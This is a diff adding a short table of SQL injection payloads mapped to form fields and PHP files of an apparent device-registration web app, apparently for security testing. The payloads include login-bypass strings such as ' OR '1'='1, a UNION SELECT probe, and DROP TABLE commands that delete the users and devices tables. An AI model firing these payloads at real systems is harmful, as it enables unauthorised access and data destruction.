@@ -1,0 +1,14 @@
+field		payload					file
+email		' OR '1'='1	                        connection.php
+fname		'; DROP TABLE users; --	                connection.php
+lname		admin' --	                        connection.php
+phone		12345 OR 1=1                     	connection.php
+psw		' OR '' = '				connection.php
+vimei		' OR 1=1 --				displaystatus.php
+email		' UNION SELECT null,null --		login-connection.php
+psw		' OR 'a'='a				login-connection.php
+imei		1'; DROP TABLE devices; --		reg-imei.php
+pmodel		X1' OR '1'='1				reg-imei.php
+radioStatus	ON' OR '1'='1				reg-imei.php
+imei_id_text	' OR 1=1 --				status.php
+radio		Active' OR '1'='1			status.php
